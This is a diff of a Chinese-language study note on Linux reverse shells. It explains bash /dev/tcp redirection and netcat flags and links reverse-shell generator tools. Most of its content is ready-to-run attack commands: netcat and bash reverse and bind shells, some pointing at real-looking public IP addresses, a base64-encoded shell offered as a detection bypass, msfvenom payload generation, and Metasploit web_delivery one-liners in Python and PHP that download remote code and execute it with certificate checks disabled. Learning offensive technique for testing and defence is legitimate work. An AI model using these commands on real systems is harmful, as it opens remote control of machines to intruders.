@@ -65,7 +65,7 @@ nc -lvvp 7777
 # 被控端
 bash -i >& /dev/tcp/192.168.1.10/7777 0>&1
 ```
-- `bash -i` 打开一个交互式的bash shell
+- `bash -i` 打开一个交互式的bash shell.   [[Linux中Shell的几种类型|What is shell?]]
 - `/dev/tcp/IP/PORT` /dev/tcp是Linux中的一个特殊设备文件(一切解文件), 实际不存在, bash用来实现网络请求的接口, 打开即发起一个socket连接, 读写即在这个socket连接中传输数据
 
 ### 通过socket连接通信
@@ -107,19 +107,22 @@ bash -i > /dev/tcp/192.168.1.101/6666 0>&1 2>&1
 `>&`, `&>` 混合输出, 即将标准输出, 错误输出全都重定向到一个位置
 `0>&1` 将标准输入的读取对象设置为标准输出的输出对象, 即将标准输入也重定向到目标位置
 
-## Linux反弹Shell
-### NC
+## 生成攻击payload
+[https://github.com/0dayCTF/reverse-shell-generator](https://github.com/0dayCTF/reverse-shell-generator)
+https://github.com/t3l3machus/hoaxshell
+## Linux反弹Shell使用方法
+### NC (netcat)
 - 正向shell: 被控端使用nc将/bin/sh绑定到本地6666端口, 控制端主控连接6666
 ```shell
 # 被控端
 nc -lvvp 6666 -e /bin/sh
 # 控制端
-nc 10.10.1.7 6666
+nc <被控端IP> 6666
 ```
 - 反向shell: 被控端使用nc将/bin/sh发送到控制端的6666端口, 控制端监听本地6666端口
 ```shell
 # 被控端
-nc -e /bin/sh 10.10.1.11 6666
+nc -e /bin/sh <控制端IP> 6666
 # 控制端
 nc -lvvp 6666
 ```
@@ -131,6 +134,13 @@ mknod backpipe p; nc 192.168.1.101 6666 0<backpipe | /bin/bash 1>backpipe 2>back
 ```
 Linux mkfifo: https://www.cnblogs.com/old-path-white-cloud/p/11685558.html
 Linux mknod: https://man.linuxde.net/mknod
+- 正向或反向, 分别需要不同的IP信息(控制端或被控端)
+- 参数:
+	- `-e` 指定一个文件名, 连接后执行, 有些nc没有\[!dangerous\]
+	- `-l` 监听模式
+	- `-v` 显示详细信息, `-vv` 更加详细
+	- `-n` 禁止`名称/端口`形式的DNS解析, 只使用IP
+	- `-p` 指定端口, 位置在最后
 
 ### Bash
 ```shell
@@ -141,9 +151,15 @@ exec 5<>/dev/tcp/139.155.49.43/6666;cat <&5 | while read line; do $line 2>&5 >&5
 nc –lvvp 6666
 
 # base64编码绕过: 
+bash -i >& /dev/tcp/47.101.214.85/6666 0>&1
 bash -c "echo YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMDEuMjE0Ljg1LzY2NjYgMD4mMQ==|base64 -d|bash -i"
 ```
+```shell
 msfvenom -p cmd/unix/reverse_bash lhost=10.10.1.11 lport=6666 -f raw
+
+bash -c '0<&200-;exec 200<>/dev/tcp/192.168.3.32/6666;sh <&200 >&200 2>&200'
+```
+![[腾讯课堂20230811213414.png]]
 
 ### Python
 ```shell
@@ -162,7 +178,7 @@ msf5 exploit(multi/script/web_delivery) > set target 0
 msf5 exploit(multi/script/web_delivery) > set payload python/meterpreter/reverse_tcp
 msf5 exploit(multi/script/web_delivery) > set lport 8888
 msf5 exploit(multi/script/web_delivery) > exploit –j
-
+#
 python -c "import sys;import ssl;u=__import__('urllib'+{2:'',3:'.request'}[sys.version_info[0]],fromlist=('urlopen',));r=u.urlopen('http://139.155.49.43:8080/pWMAajktf', context=ssl._create_unverified_context());exec(r.read());"
 ```
 
@@ -181,7 +197,7 @@ use exploit/multi/script/web_delivery
 msf5 exploit(multi/script/web_delivery) > set target 1
 msf5 exploit(multi/script/web_delivery) > set payload php/meterpreter/reverse_tcp
 msf5 exploit(multi/script/web_delivery) > exploit –j
-
+#
 php -d allow_url_fopen=true -r "eval(file_get_contents('http://139.155.49.43:8080/RRfKpX', false, stream_context_create(['ssl'=>['verify_peer'=>false,'verify_peer_name'=>false]])));"
 ```
 
